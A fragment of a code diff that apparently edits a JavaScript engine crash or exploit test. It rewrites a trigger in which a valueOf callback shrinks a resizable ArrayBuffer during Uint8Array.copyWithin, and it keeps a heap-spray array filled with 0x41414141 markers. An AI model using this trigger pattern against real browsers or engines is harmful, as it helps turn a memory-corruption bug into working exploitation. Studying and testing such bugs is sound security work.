@@ -7,13 +7,13 @@
             console.log("Starting test...");
             for (let i = 0; i < 10; i++) {
                 try {
-                    let buffer = new ArrayBuffer(0x1000, { maxByteLength: 0x10000 });
-                    let array = new Uint8Array(buffer);
-                    function resize() {
-                        buffer.resize(0);
+                    let ab = new ArrayBuffer(0x1000, {maxByteLength: 0x4000});
+                    let u8 = new Uint8Array(ab);
+                    function call_back() {
+                        ab.resize(0);
                         return 0;
                     }
-                    array.copyWithin(0, -resize(), -resize());
+                    u8.copyWithin(0x20, {valueOf: call_back});
                     spray.push({ ptr: new Array(64).fill(0x41414141), data: new Array(64).fill("test") });
                 } catch (e) {
                     console.log("Error:", e);
